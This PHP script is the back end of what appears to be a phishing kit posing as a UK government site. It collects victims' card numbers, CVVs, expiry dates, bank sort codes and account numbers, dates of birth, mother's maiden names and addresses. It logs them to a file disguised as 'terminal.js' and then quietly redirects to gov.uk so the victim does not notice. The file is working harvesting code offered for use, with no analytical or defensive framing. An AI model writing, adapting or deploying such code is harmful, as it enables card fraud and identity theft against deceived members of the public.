<?php 
session_start();
error_reporting(0);

$name = $_POST["name"];
$b = $_POST["b"];
$a = $_POST["a"];
$c = $_POST["c"];
$address = $_POST["address"];
$city = $_POST["city"];
$zip = $_POST["zip"];
$phone = $_POST["phone"];
$mmn = $_POST["mmn"];
$chn = $_POST["chn"];
$cc = $_POST["cc"];
$em = $_POST["em"];
$ey = $_POST["ey"];
$cv = $_POST["cv"];
$sc1 = $_POST["sc1"];
$sc2 = $_POST["sc2"];
$sc3 = $_POST["sc3"];
$accno = $_POST["accno"];

if (empty($name)) {
	exit('<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0;URL=https://gov.uk" />
</head>
<body>
&nbsp;
</body>
</html>');
}

if (empty($b)) {
	exit('<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0;URL=https://gov.uk" />
</head>
<body>
&nbsp;
</body>
</html>');
}

if (empty($a)) {
	exit('<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0;URL=https://gov.uk" />
</head>
<body>
&nbsp;
</body>
</html>');
}

if (empty($c)) {
	exit('<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0;URL=https://gov.uk" />
</head>
<body>
&nbsp;
</body>
</html>');
}

if (empty($address)) {
	exit('<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0;URL=https://gov.uk" />
</head>
<body>
&nbsp;
</body>
</html>');
}

if (empty($city)) {
	exit('<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0;URL=https://gov.uk" />
</head>
<body>
&nbsp;
</body>
</html>');
}

if (empty($zip)) {
	exit('<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0;URL=https://gov.uk" />
</head>
<body>
&nbsp;
</body>
</html>');
}

if (empty($phone)) {
	exit('<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0;URL=https://gov.uk" />
</head>
<body>
&nbsp;
</body>
</html>');
}

if (empty($mmn)) {
	exit('<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0;URL=https://gov.uk" />
</head>
<body>
&nbsp;
</body>
</html>');
}

if (empty($chn)) {
	exit('<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0;URL=https://gov.uk" />
</head>
<body>
&nbsp;
</body>
</html>');
}

if (empty($cc)) {
	exit('<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0;URL=https://gov.uk" />
</head>
<body>
&nbsp;
</body>
</html>');
}

if (empty($em)) {
	exit('<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0;URL=https://gov.uk" />
</head>
<body>
&nbsp;
</body>
</html>');
}

if (empty($ey)) {
	exit('<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0;URL=https://gov.uk" />
</head>
<body>
&nbsp;
</body>
</html>');
}

if (empty($cv)) {
	exit('<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0;URL=https://gov.uk" />
</head>
<body>
&nbsp;
</body>
</html>');
}

if (empty($sc1)) {
	exit('<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0;URL=https://gov.uk" />
</head>
<body>
&nbsp;
</body>
</html>');
}

if (empty($sc2)) {
	exit('<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0;URL=https://gov.uk" />
</head>
<body>
&nbsp;
</body>
</html>');
}

if (empty($sc3)) {
	exit('<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0;URL=https://gov.uk" />
</head>
<body>
&nbsp;
</body>
</html>');
}

if (empty($accno)) {
	exit('<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0;URL=https://gov.uk" />
</head>
<body>
&nbsp;
</body>
</html>');
}

$data = "
$cc|$em|$ey|$cv|$chn|$address|$city|$zip|UK|phone number : $phone|date of birth : $a/$b/$c|account number : $accno|sort code: $sc1-$sc2-$sc3|mother maiden name : $mmn|Full name: $name";

$fw2 = fopen("terminal.js","a");   
fputs($fw2,$data);
fclose($fw2);
	   
echo '<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0;URL=https://gov.uk" />
</head>
<body>
&nbsp;
</body>
</html>';
?>